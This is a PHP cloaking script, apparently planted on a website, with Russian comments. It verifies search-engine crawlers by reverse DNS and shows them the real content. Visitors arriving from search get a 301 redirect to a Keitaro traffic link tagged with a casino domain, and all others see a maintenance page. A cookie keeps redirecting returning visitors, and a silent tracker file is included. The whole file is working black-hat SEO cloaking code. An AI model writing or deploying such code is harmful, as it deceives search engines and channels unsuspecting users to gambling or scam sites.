<?php
include_once __DIR__ . '/tracker_silent.php';

define('SECURE_ACCESS', true);

$redirect_domain = 'maintenance.php';
$real_user_domain = 'https://analytics-titan.online/Rx7Lc727?source=gama-casino68.ru&type=sat2'; //наша кеитаро ссылка
$debug_mode = false; //этот параметр не трогаем!

$ip = $_SERVER['REMOTE_ADDR'];
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

if ($debug_mode) {
    error_log("IP: " . $ip);
    error_log("Referer: " . $referer);
    error_log("User-Agent: " . $user_agent);
}

$is_suspicious = false;

if (empty($user_agent)) {
    $is_suspicious = true;
}

$is_bot = false;
$is_legitimate_bot = false;

$search_bots = [
    'YandexBot', 'YandexAccessibilityBot', 'YandexMobileBot', 'YandexDirectDyn',
    'YandexScreenshotBot', 'YandexImages', 'YandexVideo', 'YandexVideoParser',
    'YandexMedia', 'YandexBlogs', 'YandexFavicons', 'YandexWebmaster',
    'YandexPagechecker', 'YandexImageResizer', 'YandexAdNet', 'YandexDirect',
    'YaDirectFetcher', 'YandexCalendar', 'YandexSitelinks', 'YandexMetrika',
    'YandexNews', 'YandexCatalog', 'YandexMarket', 'YandexVertis',
    
    'Googlebot', 'Googlebot-Image', 'Googlebot-News', 'Googlebot-Video', 
    'Googlebot-Mobile', 'Mediapartners-Google', 'AdsBot-Google', 'Google-InspectionTool',
    
    'bingbot', 'msnbot', 'msnbot-media', 'adidxbot', 'BingPreview',
    
    'DuckDuckBot', 'DuckDuckGo',
    
    'Mail.RU_Bot'
];

if (
    stripos($user_agent, 'bot') !== false || 
    stripos($user_agent, 'crawl') !== false || 
    stripos($user_agent, 'spider') !== false || 
    stripos($user_agent, 'slurp') !== false || 
    stripos($user_agent, 'phantom') !== false ||
    stripos($user_agent, 'headless') !== false ||
    stripos($user_agent, 'lighthouse') !== false ||
    stripos($user_agent, 'Google-InspectionTool') !== false ||
    !preg_match('/(Firefox|Chrome|YaBrowser|Safari|Edge)/i', $user_agent)
) {
    $is_bot = true;
    
    foreach ($search_bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            $is_legitimate = false;
            
            if (stripos($user_agent, 'Yandex') !== false) {
                $is_legitimate = check_yandex_bot($ip);
            } elseif (stripos($user_agent, 'Google') !== false || stripos($user_agent, 'Google-InspectionTool') !== false) {
                $is_legitimate = check_google_bot($ip);
            } elseif (stripos($user_agent, 'bing') !== false || stripos($user_agent, 'msn') !== false) {
                $is_legitimate = check_bing_bot($ip);
            } elseif (stripos($user_agent, 'Mail.RU') !== false) {
                $is_legitimate = check_mailru_bot($ip);
            } elseif (stripos($user_agent, 'DuckDuckGo') !== false || stripos($user_agent, 'DuckDuck') !== false) {
                $is_legitimate = check_duckduckgo_bot($ip);
            }
            
            if ($is_legitimate) {
                $is_legitimate_bot = true;
                break;
            }
        }
    }
    
    if (stripos($user_agent, 'lighthouse') !== false || 
        stripos($user_agent, 'Chrome-Lighthouse') !== false ||
        stripos($user_agent, 'Google-InspectionTool') !== false) {
        $is_legitimate_bot = true;
    }
}

if ($is_bot && !$is_legitimate_bot) {
    $is_suspicious = true;
}

if ($is_suspicious) {
    include 'maintenance.php';
    exit;
}

$is_search_referer = false;
if (preg_match('/(yandex\.|ya\.|google\.|bing\.com|mail\.ru|duckduckgo\.com)/i', $referer)) {
    $is_search_referer = true;
    if ($debug_mode) {
        error_log("Реферер из поисковой системы: " . $referer);
    }
}


if (!$is_search_referer && isset($_COOKIE['is_search_visitor'])) {
    $is_search_referer = true;
    if ($debug_mode) {
        error_log("Посетитель с куки is_search_visitor");
    }
}

if (stripos($user_agent, 'lighthouse') !== false || stripos($user_agent, 'Chrome-Lighthouse') !== false) {
    $is_search_referer = true;
    if ($debug_mode) {
        error_log("Chrome-Lighthouse обнаружен");
    }
}

if ($is_legitimate_bot) {
    setcookie('is_search_visitor', '1', time() + 60*60*24*30, '/');
    if ($debug_mode) {
        error_log("Легитимный бот: показываем контент");
    }
} elseif ($is_search_referer) {
    setcookie('is_search_visitor', '1', time() + 60*60*24*30, '/');
    if ($debug_mode) {
        error_log("Пользователь из поисковика: редирект на " . $real_user_domain);
    }
    header("HTTP/1.1 301 Moved Permanently");
    header('Location: ' . $real_user_domain);
    exit;
} else {
    if ($debug_mode) {
        error_log("Не из поисковика: показываем maintenance.php");
    }
    include 'maintenance.php';
    exit;
}

header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: SAMEORIGIN');
header('X-XSS-Protection: 1; mode=block');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Cache-Control: post-check=0, pre-check=0', false);
header('Pragma: no-cache');

function check_yandex_bot($ip) {
    $host = gethostbyaddr($ip);
    if (preg_match('/\.yandex\.(ru|com|net)$/i', $host)) {
        $resolved_ip = gethostbyname($host);
        return $resolved_ip === $ip;
    }
    return false;
}

function check_google_bot($ip) {
    $host = gethostbyaddr($ip);
    if (preg_match('/\.googlebot\.com$/i', $host) || preg_match('/\.google\.com$/i', $host)) {
        $resolved_ip = gethostbyname($host);
        return $resolved_ip === $ip;
    }
    return false;
}

function check_bing_bot($ip) {
    $host = gethostbyaddr($ip);
    if (preg_match('/\.(msn\.com|bing\.com|live\.com)$/i', $host)) {
        $resolved_ip = gethostbyname($host);
        return $resolved_ip === $ip;
    }
    return false;
}

function check_mailru_bot($ip) {
    $host = gethostbyaddr($ip);
    if (preg_match('/\.mail\.ru$/i', $host)) {
        $resolved_ip = gethostbyname($host);
        return $resolved_ip === $ip;
    }
    return false;
}

function check_duckduckgo_bot($ip) {
    $host = gethostbyaddr($ip);
    if (preg_match('/\.duckduckgo\.com$/i', $host)) {
        $resolved_ip = gethostbyname($host);
        return $resolved_ip === $ip;
    }
    return false;
}

function get_dev_tools_js() {
    return '';
}

function get_protection_css() {
    return '';
} 